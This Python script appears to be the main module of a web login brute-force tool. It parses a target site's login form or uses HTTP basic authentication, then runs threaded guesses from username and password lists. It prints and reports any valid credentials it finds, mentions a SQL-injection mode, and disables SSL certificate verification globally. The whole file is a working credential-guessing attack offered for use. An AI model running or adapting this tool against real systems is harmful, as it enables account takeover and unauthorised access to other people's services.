#!/usr/bin/python

# CHECK IMPORTING MODULES

try:
	import sys, ssl, itertools
	from core import actions, utils, tbrowser, options
	from plugins import loginbrute, httpauth

except ImportError as err:
	print(err)
	sys.exit("Error while importing modules")


########################## SSL
#	https://stackoverflow.com/a/35960702
#
########################## End ssl

def main(optionURL, setOptions, optionRunMode, setRunOptions):
	
	def do_job(jobs):
		for job in jobs:
			job.start()
			utils.printp
		for job in jobs:
			job.join()


	import time, os, threading

	# CHECK IMPORTING ALL LIBS. IMPORT HERE -> CALL HELP_BANNER ONLY FASTER
	try:
		import mechanize, re, requests # for basichttpauthentication, not useless, use later
	except ImportError as err:
		utils.die(err, "Try: pip install %s" %(str(err).split(" ")[-1]))

			
	try:
		_create_unverified_https_context = ssl._create_unverified_context
	except AttributeError:
		# Legacy Python that doesn't verify HTTPS certificates by default
		pass
	else:
		# Handle target environment that doesn't support HTTPS verification
		ssl._create_default_https_context = _create_unverified_https_context

	try:
		from Queue import Queue
	except ImportError:
		from queue import Queue
	
	result = Queue()


	# BUG bad memory management
	
	optionUserlist, optionThreads, optionKeyFalse, optionPasslist = setOptions.values()
	optionProxy, optionReport, optionVerbose = setRunOptions.values()
		
	try:
		optionUserlist = optionUserlist.split("\n")
	except:
		pass

	try:
		optionPasslist = optionPasslist.split("\n")
	except:
		pass


	## End of testing

	timeStarting = time.time()

	# get login form info 
	# call brute
	
	IS_REGULAR = True
	

	# IF NOT HTTP BASIC AUTHENTICATION, CHECK RESULT AND PARSE LOGIN FORM
	proc = tbrowser.startBrowser()
	proc.addheaders = [('User-Agent', tbrowser.useragent())]

	if optionRunMode not in ["--httpauth"]:

		try:
			utils.printf("Checking connection...")
			proc.open(optionURL)
			#TODO PROXY
			utils.printf("[*] Connect success!", "good")
			loginInfo = tbrowser.parseLoginForm(proc.forms())

			if not loginInfo:
				utils.die("[x] URL error", "No login field found")

			elif actions.size_o(loginInfo[1]) == 1: # Password checking only
				utils.printf("[*] Form with password field", "good")
				del optionUserlist[:]
				optionUserlist = [""]
				IS_REGULAR = False

			elif actions.size_o(loginInfo[1]) == 2:
				utils.printf("[*] Form username+password field", "good")

		except Exception as err:
			utils.die("[x] Can't connect to target", err)

		finally:
			proc.close()
			
	#### END OF CHECKING TARGET
	
	
	sizePasslist = actions.size_o(optionPasslist)
	sizeUserlist = actions.size_o(optionUserlist)
	workers = []
	
	utils.printf("Starting attack....\nTask count: %s tasks" %(sizeUserlist * sizePasslist))

	############################
	#	Setting up threads
	############################
	
	try:
		for password in optionPasslist:
			for username in optionUserlist:
				username, password = username.replace("\n", ""), password.replace("\n", "")
				
				
				####
				#	IF HAVE ENOUGH THREAD, DO IT ALL
				###
				if actions.size_o(workers) == optionThreads:
					do_job(workers)
					del workers[:]

				if optionRunMode == "--brute":
					worker = threading.Thread(
						target = loginbrute.submit,
						args = (
							optionURL, [password, username],
							optionProxy, optionKeyFalse, optionVerbose, loginInfo, result
						)
					)
				elif optionRunMode == "--httpauth":
					worker = threading.Thread(
						target = httpauth.submit,
						args = (
							optionURL, username, password,
							optionProxy, optionVerbose, result
						)
					)
				worker.daemon = True
				workers.append(worker)
	
	######### END SETTING UP THREADS ################
		
		#DO ALL LAST TASKs
		do_job(workers)
		del workers[:]

	### CATCH ERRORS ###
	except KeyboardInterrupt:# as error:
		# TODO: kill running threads here
		utils.die("[x] Terminated by user!", "KeyboardInterrupt")

	except SystemExit:# as error
		utils.die("[x] Terminated by system!", "SystemExit")

	except Exception as error:
		utils.die("[x] Runtime error", error)

	### ALL TASKS DONE ####
	finally:
		runtime = time.time() - timeStarting
		"""
			All threads have been set daemon
			Running threads should be stopped after main task done
		"""
		############################################
		#	Get result
		#
		############################################

		try:
			credentials = list(result.queue)
			if actions.size_o(credentials) == 0:
				utils.printf("[-] No match found!", "bad")
				
			else:
				utils.printf("\n[*] %s valid password[s] found:\n" %(actions.size_o(credentials)), "norm")

				if IS_REGULAR:
					utils.print_table(("Username", "Password"), *credentials)
				else:
					if optionRunMode != "--sqli":
						utils.print_table(("", "Password"), *credentials)
					else:
						utils.print_table(("Payload", ""), *credentials) # TODO: test more
			
			
			### CREATE REPORT ####
			if optionReport:
				try:
					import reports

					optionProxy = "True" if optionProxy else "False"
					report_name = "%s_%s" %(time.strftime("%Y.%m.%d_%H.%M"), optionURL.split("/")[2])
					report_path = "%s/%s.txt" %(reports.__path__[0], report_name)
					
					reports.makeReport(
						utils.report_banner(
							optionURL,
							optionRunMode,
							optionProxy,
							optionThreads,
							credentials,
							report_name,
							runtime,
							IS_REGULAR),
						report_path)
					
					utils.printf("\n[*] Report file at:\n%s" %(report_path), "good")
					
				except Exception as err:
					utils.printf("[x] Error while creating report: %s" %(err), "bad")
						
		except Exception as err:
			utils.printf("\n[x] Error while getting result.\n", "bad")
			utils.printf(err, "bad")

		utils.printf("\n[*] Time elapsed: %0.5s [s]\n" %(runtime), "good")

		sys.exit(0)

if __name__ == "__main__":
	main(*options.getUserOptions())